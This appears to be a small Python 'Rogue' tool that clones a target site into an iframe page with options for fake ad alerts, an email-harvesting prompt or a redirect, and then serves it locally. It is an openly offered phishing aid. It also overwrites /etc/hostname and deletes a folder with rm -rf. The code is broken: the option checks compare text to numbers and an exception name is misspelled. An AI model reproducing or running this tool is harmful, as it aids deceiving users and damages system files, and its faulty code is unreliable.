import os
import sys
from time import sleep

os.system("rm -rf Page")
print("Rogue         ___ ___________  ___    ___")
print("/-----------| |_| | _________| | |    | |")
print("| |---------|  _  | |________  | |    | |")
print("| |________   | | |_________ | | |____| |")
print("| |________|  | | _________| | | ______ |")
print("| |           | | |__________| | |    | |")
print("| |           | |              | |    | |")
print("| |           | |              |_|    |_|")
print("|_|           |_| By guille-exploit@protonmail.com")
cpurl = input("site to clone: ")
print("     [01] Ads")
print("     [02] email cat")
print("     [03] redirect to another website")
print("     [04] Null")
opt = input("choose a option: ")
host = input("Host of the site: ")
os.chdir("/etc")
ok = open("hostname", "w")
okw = ok.write(host)
ok.close()
os.mkdir("Page")
os.chdir("Page")
ope = open("site.html", "w")
if opt == 1:
    Ad = input("Ad: ")
    opew = ope.write("""<html> \n <head> \n \t <iframe src='{}'> \n </head> \n <body> \n \t <script> window.alert('{}') </script> \n </body> \n </html>""".format(cpurl, Ad))
elif opt == 2:
    opew = ope.write("""<html> \n <head> \n \t <iframe src='{}'> \n </head> \n <body> \n \t <script> window.alert('What is your email?' + prompt('email')) </script> \n </body> \n </html>""".format(cpurl))
elif opt == 3:
    site = input("site to redirect: ")
    opew = ope.write("""<html> \n <head> \n \t <iframe src='{}'> \n </head> \n <body> \n \t <script> window.open('{}') </script> \n </body> \n </html>""".format(cpurl, site))
else:
    opew = ope.write("""<html> \n <head> \n \t <iframe src='{}'> \n </head> \n </html>""".format(cpurl))
ope.close()
print("starting server...")
print("sever started.")
print("press ctrl + c to quit")
try:
   os.system("python3 -m http.server 8080")
except KeyboardInterupt:
    sys.exit()
